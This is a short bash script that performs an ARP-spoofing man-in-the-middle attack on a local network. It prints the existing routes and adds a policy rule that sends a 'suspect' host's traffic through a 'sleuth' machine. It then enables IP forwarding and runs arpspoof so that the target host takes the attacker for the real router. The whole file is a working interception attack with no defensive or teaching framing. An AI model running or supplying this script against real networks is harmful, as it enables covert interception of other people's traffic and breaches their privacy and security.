#!/bin/bash

export ROUTER=192.168.0.111
export SLEUTH=192.168.0.127
export SUSPECT=192.168.0.104
export REAL_ROUTER=192.168.0.1
export TABLE=111
export INTERFACE=eth0


echo "CURRENT PARAMS:" 
echo
echo "IP RULES"
ip rule list
echo 
echo "IP ROUTES"
ip route list
echo 
echo "IP ROUTE TABLE:" $TABLE
ip route list table $TABLE
echo
echo
echo

ip rule add from $SUSPECT table $TABLE priority 4
ip route add default via $SLEUTH table $TABLE
echo
echo
echo "NEW PARAMS:" 
echo
echo "IP RULES"
ip rule list
echo 
echo "IP ROUTES"
ip route list
echo 
echo "IP ROUTE TABLE:" $TABLE
ip route list table $TABLE
echo
echo
echo

echo 1 > /proc/sys/net/ipv4/ip_forward

arpspoof -i $INTERFACE -t $SUSPECT $REAL_ROUTER
